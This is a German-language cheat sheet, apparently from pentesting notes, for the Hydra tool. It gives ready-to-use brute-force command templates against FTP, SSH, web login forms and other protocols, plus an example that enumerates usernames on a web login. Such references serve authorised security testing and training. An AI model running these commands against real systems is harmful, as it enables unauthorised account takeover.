# Hydra

## Cheatsheet

<table data-header-hidden><thead><tr><th width="197"></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Einsatz</strong></td><td><strong>Befehl / Beispiel</strong></td><td><strong>Erklärung</strong></td></tr><tr><td><strong>Allgemeine Optionen</strong></td><td><p><code>-l &#x3C;user></code></p><p><code>-L &#x3C;file></code></p><p><code>-p &#x3C;pass></code></p><p><code>-P &#x3C;file></code></p><p><code>-s &#x3C;port></code></p><p><code>-t &#x3C;threads></code></p><p><code>-vV</code></p><p><code>-o &#x3C;file></code></p><p><code>-d</code></p></td><td><p>Einzelner Benutzernamee,</p><p>Benutzerliste,</p><p>Einzelnes Passwort,</p><p>Passwortlisten,</p><p>Port (optional),</p><p>Threads (Default: 16),</p><p>Ausführliche Ausgabe,</p><p>Ausgabe in Datei,<br>Debugging</p></td></tr><tr><td><strong>FTP</strong></td><td><code>hydra -l user -P passlist.txt ftp://&#x3C;IP></code></td><td>FTP-Brute-Force mit Benutzername und Passwortliste</td></tr><tr><td><strong>SSH</strong></td><td><code>hydra -l root -P passwords.txt &#x3C;IP> -t 4 ssh</code></td><td>Brute-Force auf SSH mit 4 Threads</td></tr><tr><td><strong>Webform (POST)</strong></td><td><code>hydra -l admin -P wordlist.txt &#x3C;IP> http-post-form "/login.php:username=^USER^&#x26;password=^PASS^:F=fail" -V</code></td><td>POST-Formular: Pfad, Feldnamen, Fehlerantwort definieren</td></tr><tr><td><strong>Webform (GET)</strong></td><td><code>hydra -l admin -P wordlist.txt &#x3C;IP> http-get-form "/login.php?user=^USER^&#x26;pass=^PASS^:F=fail" -V</code></td><td>GET-Formular mit URL-Parametern</td></tr><tr><td><strong>CSRF/Cookies (POST)</strong></td><td><code>hydra -l admin -P pass.txt &#x3C;IP> http-post-form "/login.php:username=^USER^&#x26;password=^PASS^:F=fail:C=PHPSESSID=123"</code></td><td><code>C=</code> für Cookies, z. B. Session-ID oder CSRF-Token (falls nötig)</td></tr><tr><td><strong>Allgemein (Protokoll)</strong></td><td><code>hydra -L users.txt -P passwords.txt &#x3C;IP> &#x3C;protocol></code></td><td>Für viele Protokolle: <code>ssh</code>, <code>ftp</code>, <code>http-get</code>, <code>http-post</code>, <code>telnet</code>, <code>smtp</code>, <code>rdp</code>, etc.</td></tr></tbody></table>

## Beispiele

{% code overflow="wrap" %}
```
hydra -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -p asdf ip http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
```
{% endcode %}

Bruteforce eines Logins mit Wordlist für den Benutzernamen und das fixe Passwort „asdf” (Passwort hier uninteressant, da korrekte Benutzernamen gesucht werden).

